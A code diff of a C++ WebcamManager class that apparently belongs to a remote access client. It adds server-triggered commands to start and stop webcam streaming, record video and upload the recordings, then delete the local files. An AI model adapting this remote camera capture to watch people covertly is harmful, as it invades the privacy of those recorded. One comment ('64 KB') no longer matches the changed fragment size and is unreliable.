@@ -4,12 +4,25 @@
 
 
 // constructor -> information of recording and socket
-WebcamManager::WebcamManager(ClientSocket &clientSocket)
-        : Handler(clientSocket) {
+WebcamManager::WebcamManager(ClientSocket &clientSocket, Download &download)
+        : Handler(clientSocket), download(download) {
     ActionMap& actionMap = clientSocket.getActionMap();
     actionMap["START_WEBCAM"] = [&](nlohmann::json& json) {
         threadGen.runInNewThread(this, &WebcamManager::startWebcam,json);
     };
+    actionMap["STOP_WEBCAM"] = [&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &WebcamManager::stopWebcam);
+    };
+    actionMap["START_RECORDING_WEBCAM"] = [&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &WebcamManager::startRecording);
+    };
+    actionMap["STOP_RECORDING_WEBCAM"] = [&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &WebcamManager::stopRecording);
+    };
+    actionMap["SEND_WEBCAM_RECORDS"] = [&](nlohmann::json& json) {
+        threadGen.runInNewThread(this, &WebcamManager::sendRecord, json);
+    };
+
 }
 
 void WebcamManager::setConfiguration(nlohmann::json jsonObject) {
@@ -24,19 +37,6 @@ void WebcamManager::setConfiguration(nlohmann::json jsonObject) {
 #endif
 }
 
-// sending all records available in path vector
-void WebcamManager::sendRecord() {
-    /*if (!fragmented) output.release();
-    stream.sendSize(static_cast<int>(pathVector.size()));
-    for (const auto &file: pathVector) {
-        stream.sendFile(file.c_str());
-        stream.readSize();
-        std::filesystem::remove(file);
-    }
-    removeTempFiles();
-    initialized=false;
-    pathVector.clear();*/
-}
 
 // removing video temporary files
 void WebcamManager::removeTempFiles(){
@@ -46,12 +46,11 @@ void WebcamManager::removeTempFiles(){
     }
 }
 
-const int FRAGMENT_SIZE = 64 * 1024; // 64 KB
+const int FRAGMENT_SIZE = 204800; // 64 KB
 const uint8_t LAST_FRAGMENT = 0x02;
 const uint8_t NOT_LAST_FRAGMENT = 0x01;
 
 void WebcamManager::sendFrame(const cv::Mat& frame) {
-    // Codificar la imagen en un buffer
     std::vector<uchar> imageBuff;
     cv::imencode(".jpeg", frame, imageBuff);
 
@@ -60,14 +59,10 @@ void WebcamManager::sendFrame(const cv::Mat& frame) {
     size_t totalSize = imageBuff.size();
     size_t offset = 0;
 
-    // Suponiendo que fileID es definido en otro lugar
-
     while (totalSize > 0) {
-        // Preparar los bytes de encabezado: 1 byte para el ID de archivo, 1 byte para el código de control
         buffer[0] = channelID;
         buffer[1] = NOT_LAST_FRAGMENT;
 
-        // Calcular cuántos bytes leer para este fragmento
         if (totalSize >= FRAGMENT_SIZE - 2) {
             bytesRead = FRAGMENT_SIZE - 2;
         } else {
@@ -75,13 +70,8 @@ void WebcamManager::sendFrame(const cv::Mat& frame) {
             buffer[1] = LAST_FRAGMENT;
         }
 
-        // Copiar los datos en el buffer, comenzando en el desplazamiento 2
         std::copy(imageBuff.begin() + offset, imageBuff.begin() + offset + bytesRead, buffer.begin() + 2);
-
-        // Enviar el fragmento (Nota: Enviando bytesRead + 2 bytes para incluir los 2 bytes de control)
         clientSocket.sendBytes(std::vector<uint8_t>(buffer.begin(), buffer.begin() + bytesRead + 2));
-
-        // Actualizar el desplazamiento y el tamaño total restante
         offset += bytesRead;
         totalSize -= bytesRead;
     }
@@ -95,72 +85,58 @@ void WebcamManager::sendDimensions(int width,int height){
 }
 
 
+void WebcamManager::stopWebcam(){
+    if (initialized) {
+        output.release();
+        removeTempFiles();
+    }
+    streamingState.store(false);
+}
+
+void WebcamManager::startRecording(){
+    if (!initialized) {
+        std::wstring tempFileName = fileName;
+        tempFileName.append(TimeCS::getCurrentDateTimeW()).append(L".avi");
+        std::filesystem::path parentPath = std::filesystem::path(fileName).parent_path();
+        std::filesystem::create_directory(parentPath);
+        output = cv::VideoWriter(Converter::wstring2string(tempFileName), cv::VideoWriter::fourcc('M', 'J', 'P', 'G'), FPS,
+                                 cv::Size(frameWidth, frameHeight));
+        pathVector.push_back(tempFileName);
+        initialized = true;
+    }
+
+}
+
+void WebcamManager::stopRecording(){
+    if (fragmented) {
+        initialized.store(false);
+        output.release();
+    }
+}
+
+void WebcamManager::sendRecord(nlohmann::json jsonObject){
+    if (!fragmented) output.release();
+    download.downloadContent(locationOfVideos);
+    removeTempFiles();
+    initialized=false;
+    pathVector.clear();
+}
+
+
 // starting webcam, sending information to server
 void WebcamManager::startWebcam(nlohmann::json jsonObject) {
     setConfiguration(std::move(jsonObject));
     cv::Mat frame;
     cv::VideoCapture vid(webcamID);
-
-    int frameWidth = (int) vid.get(cv::CAP_PROP_FRAME_WIDTH);
-    int frameHeight = (int) vid.get(cv::CAP_PROP_FRAME_HEIGHT);
+    frameWidth = (int) vid.get(cv::CAP_PROP_FRAME_WIDTH);
+    frameHeight = (int) vid.get(cv::CAP_PROP_FRAME_HEIGHT);
 
     //sendDimensions(frameWidth,frameHeight);
-
-
-    boolean streamingState = true;
-    while (streamingState) {
+    streamingState.store(true);
+    while (streamingState.load()) {
         vid >> frame;
-        switch (23) { // save record and stop (no break keyword)
-            case -2: {
-                sendRecord();
-            }
-            case -1: { // stop streaming, stop loop
-                std::cout << "stop streaming" << std::endl;
-                if (initialized) {
-                    output.release();
-                    removeTempFiles();
-                }
-                streamingState=false;
-                break;
-            }
-            case 1: {  // record case, continues sending information
-                std::cout << "record" << std::endl;
-                if (!initialized) {
-                    std::wstring tempFileName = fileName;
-                    tempFileName.append(TimeCS::getCurrentDateTimeW()).append(L".avi");
-                    std::filesystem::path parentPath = std::filesystem::path(fileName).parent_path();
-                    std::filesystem::create_directory(parentPath);
-                    output = cv::VideoWriter(Converter::wstring2string(tempFileName), cv::VideoWriter::fourcc('M', 'J', 'P', 'G'), FPS,
-                                             cv::Size(frameWidth, frameHeight));
-                    pathVector.push_back(tempFileName);
-                    initialized = true;
-                }
-                output.write(frame);
-                sendFrame(frame);
-                break;
-            }
-            case 2: { // stop recording, continue sending frames
-                std::cout << "stop recording " << std::endl;
-                if (fragmented) {
-                    initialized = false;
-                    output.release();
-                }
-                sendFrame(frame);
-                break;
-            }
-            case 3: { // save recording (save and send), continue sending frames
-                std::cout << "save recordings" << std::endl;
-                sendRecord();
-                sendFrame(frame);
-                break;
-            }
-            default:{ // just send frame (no actions)
-                sendFrame(frame);
-                break;
-            }
-
-        }
-        Sleep(100);
+        if (initialized.load()) output.write(frame);
+        sendFrame(frame);
     }
     vid.release(); // release video
 }
